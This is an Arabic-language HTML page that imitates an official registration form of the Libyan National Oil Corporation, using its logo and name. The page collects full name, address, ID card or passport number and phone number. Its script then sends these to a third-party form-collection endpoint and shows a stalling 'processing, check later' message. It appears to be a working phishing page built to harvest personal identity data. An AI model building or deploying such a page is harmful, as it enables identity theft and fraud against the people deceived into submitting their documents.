<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>نموذج التسجيل - مؤسسة النفط الليبية</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: #f2f2f2;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: #ffffff;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 450px;
      box-sizing: border-box;
      border-top: 5px solid #003366;
      text-align: center;
    }

    .container img.logo {
      width: 150px;
      margin-bottom: 10px;
    }

    h2 {
      color: #003366;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
      color: #003366;
      text-align: right;
    }

    input, select, button {
      width: 100%;
      padding: 10px;
      font-size: 15px;
      margin-top: 5px;
      border-radius: 6px;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }

    button {
      background-color: #28a745;
      color: white;
      border: none;
      cursor: pointer;
      margin-top: 20px;
    }

    button:hover {
      background-color: #218838;
    }

    .popup {
      display: none;
      position: fixed;
      top: 30px;
      left: 0;
      right: 0;
      margin: auto;
      max-width: 420px;
      background: #ffffff;
      border: 2px solid #003366;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
      z-index: 1000;
      text-align: center;
    }

    .popup h3 {
      font-size: 16px;
      margin-bottom: 15px;
    }

    .countdown {
      text-align: center;
      font-weight: bold;
      margin-top: 10px;
      color: #cc0000;
    }
  </style>
</head>
<body>

<div class="container" id="formContainer">
  <img src="https://upload.wikimedia.org/wikipedia/ar/3/3c/NOC_Libya_Logo.png" alt="شعار المؤسسة الوطنية للنفط" class="logo" />
  <h2>نموذج التسجيل - مؤسسة النفط الليبية</h2>

  <form id="mainForm">
    <label>الاسم الكامل:</label>
    <input type="text" id="fullName" name="fullName" required />

    <label>العنوان:</label>
    <input type="text" id="address" name="address" required />

    <label>نوع الوثيقة:</label>
    <select id="docType" required>
      <option value="">اختر نوع الوثيقة</option>
      <option value="بطاقة">بطاقة</option>
      <option value="جواز سفر">جواز سفر</option>
    </select>

    <div id="docNumberContainer" style="display:none;">
      <label id="docLabel">رقم الوثيقة:</label>
      <input type="text" id="docNumber" name="docNumber" required />
    </div>

    <label>رقم الهاتف:</label>
    <input type="text" id="phone" name="phone" required />

    <button type="submit">إرسال الطلب</button>
  </form>
</div>

<!-- نافذة الاعتذار -->
<div class="popup" id="errorPopup">
  <h3 style="color: green;">جاري معالجة طلبك، الرجاء المراجعة في وقت آخر</h3>
  <button onclick="resetForm()">إعادة التسجيل من جديد</button>
</div>

<script>
  const formcarryURL = "https://formcarry.com/s/a-Yw-WFDEqO";

  document.getElementById("docType").addEventListener("change", function () {
    const docContainer = document.getElementById("docNumberContainer");
    const docLabel = document.getElementById("docLabel");
    const docNumber = document.getElementById("docNumber");

    if (this.value === "بطاقة") {
      docLabel.textContent = "رقم البطاقة:";
      docNumber.placeholder = "أدخل رقم البطاقة";
    } else if (this.value === "جواز سفر") {
      docLabel.textContent = "رقم جواز السفر:";
      docNumber.placeholder = "أدخل رقم جواز السفر";
    }

    docContainer.style.display = this.value ? "block" : "none";
  });

  document.getElementById("mainForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const fullName = document.getElementById("fullName").value.trim();
    const docType = document.getElementById("docType").value;
    const docNumber = document.getElementById("docNumber").value.trim();
    const phone = document.getElementById("phone").value.trim();
    const address = document.getElementById("address").value.trim();

    const arabicRegex = /^[\u0600-\u06FF\s]{8,}$/;
    if (!arabicRegex.test(fullName)) {
      alert("الاسم يجب أن يكون باللغة العربية ويحتوي على 8 أحرف أو أكثر.");
      return;
    }

    const phoneRegex = /^(091|092|094)\d{7}$/;
    if (!phoneRegex.test(phone)) {
      alert("يرجى إدخال رقم هاتف ليبي صحيح يبدأ بـ 091 أو 092 أو 094.");
      return;
    }

    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ fullName, docType, docNumber, phone, address })
    }).then(() => {
      // عند الإرسال بنجاح، نخفي النموذج ونظهر نافذة الاعتذار
      document.getElementById("formContainer").style.display = "none";
      document.getElementById("errorPopup").style.display = "block";
    }).catch(() => alert("حدث خطأ أثناء الإرسال"));
  });

  function resetForm() {
    location.reload();
  }
</script>

</body>
</html>
